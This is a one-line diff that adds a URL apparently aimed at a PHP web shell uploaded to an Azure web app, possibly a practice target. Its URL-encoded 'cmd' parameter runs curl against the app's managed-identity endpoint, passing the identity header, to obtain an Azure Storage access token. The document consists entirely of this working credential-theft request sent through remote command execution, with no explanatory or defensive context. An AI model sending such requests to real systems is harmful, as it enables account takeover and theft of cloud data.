@@ -1,0 +1,1 @@
+https://insecure-legal-firm-<redacted_for_security>.southafricanorth-01.azurewebsites.net/uploads/resume.php?cmd=curl%20%22%24IDENTITY_ENDPOINT%3Fresource%3Dhttps%3A%2F%2Fstorage.azure.com%2F%26api-version%3D2019-08-01%22%20-H%20%22X-IDENTITY-HEADER%3A%20%24IDENTITY_HEADER%22%202%3E%261
